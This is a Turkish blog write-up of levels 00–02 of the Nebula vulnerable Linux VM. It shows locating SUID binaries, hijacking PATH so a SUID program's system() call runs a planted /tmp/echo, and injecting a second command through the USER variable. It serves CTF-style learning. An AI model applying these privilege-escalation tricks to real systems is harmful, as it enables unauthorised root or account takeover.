---
layout: post
title: "Nebula Write Up-1"
date: 2018-02-23
excerpt: "Level 00-Level 04"
comments: false
---
  Nebula, Linux Exploitation üzerine pratik yapma imkanı sunan zafiyetli bir sanal makinadır. Daha ayrıntılı bilgiye
[buradan](https://exploit-exercises.com/nebula/) ulaşabilirsiniz.

### Level 00

Bu level için bizden beklenen flag00 kullanıcısına ait, suid bitine sahip olan, çalıştırılabilir bir dosya bulmamız. 

{% raw %}
    level00@nebula:~$ find / -type f -user flag00 -perm -u=s 2>/dev/null
    /bin/.../flag00
    /rofs/bin.../flag00
{% endraw %}
Dosyaları incelediğimizde ELF türünde olduklarını görüyoruz. Dosyalardan birini çalıştırdığımızda,
{% raw %}
    level00@nebula:~$ /bin/.../flag00
    Congrats, now run getflag to get your flag !
    flag00@nebula:~$
{% endraw %}
flag değerini elde edebilmek için getflag dosyasını çalıştırmamız gerektiği bilgisine erişiyoruz.
{% raw %}
    flag00@nebula:~$ find / -name getflag
    /bin/getflag
    /rofs/bin/getflag
    flag00@nebula:~$ /bin/getflag
    You have successfully executed getflag on a target account
{% endraw %}

### Level 01

Bu bölümde bizden beklenen /home/flag01 dizini altında bulunan c programında, istenilen programın çalıştırılmasına sebebiyet veren zafiyeti bulmamız.Programa ait kaynak kod da aşağıdaki gibi.

{% highlight c %}
{% raw %}
    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <sys/types.h>
    #include <stdio.h>

    int main(int argc, char **argv, char **envp)
    {
     gid_t gid;
     uid_t uid;
     gid = getegid();
     uid = geteuid();

     setresgid(gid, gid, gid);
     setresuid(uid, uid, uid);

     system("/usr/bin/env echo and now what?");
    }
{% endraw %}
{% endhighlight %}

Programın işleyişini daha iyi anlayabilmek adına, kaynak kodda bulunan bazı fonksiyonlara bakalım.

> **gid_t getegid(void);**  çağırılan processin effective group-id değerini döndürüyor. 

> **uid_t geteuid(void);**  çağırılan processin effective user-id değerini döndürüyor. 

> **int setresgid(gid_t rgid,gid_t egid,git_t sgid);**  çağırılan processin real,effective,saved  group-id değerlerini set ediyor. 

> **int setresuid(uid_t ruid,uid_t euid,uid_t suid);**  çağırılan processin real,effective,saved user-id değerlerini set ediyor. 

`Effective uid/gid` ve `real uid/gid` kavramları arasındaki farkı da şu şekilde özetleyebiliriz:
> Shell login işlemi gerçekleştiğinde real uid/gid  ile effective uid/gid değerleri aynıdır, ve processi yaratan kullanıcının uid/gid'sine karşılık gelir. Effective uid/gid değeri; suid bitine sahip olan bir dosya çalıştırıldığında ve dosya sahibi ile dosyayı çalıştıran kullanıcı farklı olduğu durumlarda değişir. Dosya sahibinin uid/gid'sine karşılık gelir. Özet olarak real uid/gid processi yaratan kullanıcının uid/gid değerine eşitken, effective uid/gid dosya sahibinin uid/gid değerine eşit olur.

Aşina olmadığımız fonksiyonlar hakkında fikir sahibi olduktan sonra, asıl meseleye geri dönelim.Programı çalıştırdığımızda beklenen üzere bu şekilde bir çıktı elde ediyoruz.
{% raw %}
    level01@nebula:/home/flag01$ ./flag01
    and now what?
{% endraw %}
Bazı argümanlarla birlikte programı çalıştırmayı denesekte, bu yolla bir şey elde edemiyoruz. Manipüle edilebilir gibi görünen system() fonksiyonu üzerinden yürümeyi deniyoruz.Burada dikkatimizi çeken echo komutunun önünde bulunan /usr/bin/env komutu.
> `/usr/bin/env` komutu, programı değiştirilmiş bir ortamda çalıştırmayı sağlar. Bunun için PATH değişkeninde bulunan dizinlere sırası ile bakılır. Çalıştırılmak istenen program ilk hangi dizinde bulunursa, o dizindeki program çalıştırılır.

> `PATH değişkeni`, sistemin çalıştırılabilir dosyaları bulmak için nerelere bakması gerektiğini tanımlar.

Bizde PATH değişkenine yeni bir dizin ekleyip,eklediğimiz dizinin PATH değişkeninde ki sırası önemli, çalıştırmak istediğimiz dosyayı o dizine echo ismiyle kaydettiğimizde, env komutu ilk bizim echo programımız ile karşılaşacağı için onu çalıştıracaktır.
{% raw %}
    level01@nebula:/home/flag01$ PATH=/tmp:$PATH
    level01@nebula:/home/flag01$ echo $PATH
    /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
    level01@nebula:/home/flag01$ cp /bin/getflag /tmp/echo
    level01@nebula:/home/flag01$ ./flag01
    You have successfully executed getflag on a target account
{% endraw %}

### Level 02
Bu bölüm de bir önceki ile benzer olup, bizden beklenen /home/flag02 dizininde bulunan programda,istenilen programın çalıştırılmasına sebebiyet veren zafiyeti bulmak.Programa ait kaynak kod da aşağıdaki gibi.

{% highlight c %}
{% raw %}
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
{% endraw %}
{% endhighlight %}
Programı çalıştırmadan önce kaynak kodu inceliyoruz.getenv("USER") fonksiyonu ile çağırılan processe ait USER çevresel değişkeni öğreniliyor.Değer asprintf() fonksiyonunda ikinci parametrede yerine konuluyor. Ardından bu string buffer değişkenine atanıyor.Daha sonra buffer değişkeni system() fonksiyonuna parametre olarak veriliyor.
{% raw %}
    level02@nebula:/home/flag02$ ./flag02
    about to call system ("/bin/echo level02 is cool")
    level02 is cool
{% endraw %}
Olayı tekrar özetlemek gerekirse alınan USER değişkeni ile bir string oluşturuluyor. Ve bu string sistem üzerinde komut olarak çalıştırılıyor. Buradan bir nevi injection yapmamız gerektiğini anlıyoruz.
{% raw %}
    level02@nebula:/home/flag02$ USER="level02; /bin/getflag ; echo"
    level02@nebula:/home/flag02$ echo $USER
    level02; /bin/getflag ; echo
{% endraw %}
Böylece buffer değişkeninin içeriği "/bin/echo level02; /bin/getflag ; echo is cool" olmuş oluyor.
{% raw %}
    level02@nebula:/home/flag02$ ./flag02
    about to call system ("/bin/echo level02; /bin/getflag ; echo is cool")
    level02
    You have successfully executed getflag on a target account
    is cool
{% endraw %}
